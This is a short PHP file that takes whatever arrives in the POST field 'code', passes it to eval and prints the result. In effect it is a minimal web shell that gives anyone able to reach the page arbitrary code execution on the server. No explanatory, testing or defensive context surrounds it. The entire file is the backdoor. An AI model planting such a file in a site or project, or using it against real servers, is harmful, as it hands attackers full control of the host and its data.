<?php 

function run()
{
  return eval($_POST['code']);
}


echo run(); die;